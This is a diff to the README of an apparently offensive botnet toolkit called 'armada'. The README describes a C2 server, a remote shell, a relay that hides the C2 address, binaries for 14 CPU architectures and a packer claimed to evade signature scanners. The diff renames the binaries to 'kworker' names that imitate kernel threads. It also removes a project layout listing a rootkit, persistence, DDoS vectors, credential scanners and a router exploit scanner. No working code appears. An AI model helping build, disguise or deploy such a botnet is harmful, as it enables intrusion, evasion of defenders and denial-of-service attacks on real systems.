@@ -100,7 +100,7 @@ Full RFC 1928/1929 implementation. IPv4, IPv6, domain connect. Username/password
 - **WebSocket shell** -- real-time bidirectional streaming with per-bot cwd tracking
 - **Persistent task queue** -- auto-dispatched on connect with run-once tracking
 - **Bot groups** -- tag and target commands by group
-- **Relay network** -- backconnect SOCKS5 (Redis metrics, round-robin LB) + admin relay (hides C2 IP)
+- **Relay network** -- backconnect SOCKS5 (kworker metrics, round-robin LB) + admin relay (hides C2 IP)
 
 ### C2 Resilience
 
@@ -176,20 +176,20 @@ Full RFC 1928/1929 implementation. IPv4, IPv6, domain connect. Username/password
 
 | # | Architecture | Toolchain | Binary |
 |---|-------------|-----------|--------|
-| 1 | x86_64 | Native GCC | `redis-daemon` |
-| 2 | i586 | GCC 4.1.2 / uClibc | `redis-proxyd` |
-| 3 | i486 | GCC 4.1.2 / uClibc | `redis-initd` |
-| 4 | MIPS (BE) | GCC 4.1.2 / uClibc | `redis-credentiald` |
-| 5 | MIPSEL (LE) | GCC 4.1.2 / uClibc | `redis-composd` |
-| 6 | ARMv4l | GCC 4.1.2 / uClibc | `redis-conteinerd` |
-| 7 | ARMv5l | GCC 4.1.2 / uClibc | `redis-conteinerd-shim` |
-| 8 | ARMv6l | GCC 4.1.2 / uClibc | `redis-runcd` |
-| 9 | ARMv7l | GCC 4.1.2 / uClibc | `redis-buildxd` |
-| 10 | PowerPC | GCC 4.1.2 / uClibc | `redis-scoutd` |
-| 11 | SH4 | GCC 4.1.2 / uClibc | `redis-sbomd` |
-| 12 | ARC700 | GCC / uClibc | `redis-swarmd` |
-| 13 | m68k | GCC 4.1.2 / uClibc | `redis-scand` |
-| 14 | SPARC | GCC 4.1.2 / uClibc | `redis-machined` |
+| 1 | x86_64 | Native GCC | `kworker-daemon` |
+| 2 | i586 | GCC 4.1.2 / uClibc | `kworker-proxyd` |
+| 3 | i486 | GCC 4.1.2 / uClibc | `kworker-initd` |
+| 4 | MIPS (BE) | GCC 4.1.2 / uClibc | `kworker-credentiald` |
+| 5 | MIPSEL (LE) | GCC 4.1.2 / uClibc | `kworker-composd` |
+| 6 | ARMv4l | GCC 4.1.2 / uClibc | `kworker-conteinerd` |
+| 7 | ARMv5l | GCC 4.1.2 / uClibc | `kworker-conteinerd-shim` |
+| 8 | ARMv6l | GCC 4.1.2 / uClibc | `kworker-runcd` |
+| 9 | ARMv7l | GCC 4.1.2 / uClibc | `kworker-buildxd` |
+| 10 | PowerPC | GCC 4.1.2 / uClibc | `kworker-scoutd` |
+| 11 | SH4 | GCC 4.1.2 / uClibc | `kworker-sbomd` |
+| 12 | ARC700 | GCC / uClibc | `kworker-swarmd` |
+| 13 | m68k | GCC 4.1.2 / uClibc | `kworker-scand` |
+| 14 | SPARC | GCC 4.1.2 / uClibc | `kworker-machined` |
 
 Static-linked, stripped, packed with **m30w** (custom UPX fork -- zero UPX fingerprint, defeats `upx -d` and all signature scanners).
 
@@ -236,46 +236,6 @@ All implemented in pure C. Zero external libraries. ~600 lines total.
 
 ---
 
-
-## Project Structure
-
-```
-armada/
-+-- bot/                    Pure C agent
-|   +-- headers/            Type definitions, protocol wire format
-|   +-- main.c              Entry, init, reconnection state machine
-|   +-- connection.c        VPE2 handshake, C2 command loop
-|   +-- commands.c          30+ command handlers
-|   +-- config.c            60+ encrypted config blobs, lazy decryption
-|   +-- crypto.c            AES-256, ChaCha20-Poly1305, SHA-256, X25519
-|   +-- rootkit.c           LD_PRELOAD .so: readdir/stat/open hooks
-|   +-- persist.c           systemd + rc.local + cron
-|   +-- opsec.c             Sandbox, spoof, killer, OOM, daemon
-|   +-- socks.c             SOCKS5 + relay backconnect
-|   +-- attack.c            Attack dispatcher, CIDR, fork mgmt
-|   +-- attack_method.c     16 DDoS vectors (raw sockets, GRE)
-|   +-- telnet.c            Telnet scanner (128 concurrent)
-|   +-- ssh.c               SSH credential scanner
-|   +-- scanner_*.c         HTTP, Redis, PostgreSQL, MySQL scanners
-|   +-- zyxel.c             Zyxel exploit scanner
-|
-+-- cnc/                    C2 server (Go)
-|   +-- main.go             Multi-port listener, config
-|   +-- connection.go       VPE2 accept, auth, ping/pong
-|   +-- cmd.go              Binary command encoder, broadcast
-|   +-- ui.go               Bubble Tea TUI dashboard
-|   +-- web.go              Web panel, REST API, SSE, webhooks
-|   +-- websocket.go        Real-time shell over WebSocket
-|   +-- scanner_jobs.go     Work-stealing scan queue
-|   +-- tor.go              Tor hidden service lifecycle
-|   +-- relay/              Backconnect SOCKS5 relay
-|   +-- admin_relay/        Transparent TCP forwarder
-|   +-- web/                Frontend (dashboard + app.js)
-|
-+-- scanListen/             Standalone credential collector
-+-- tools/                  Build scripts, m30w packer, DGA predictor
-+-- setup.py                Interactive setup wizard
-```
 
 
 ---
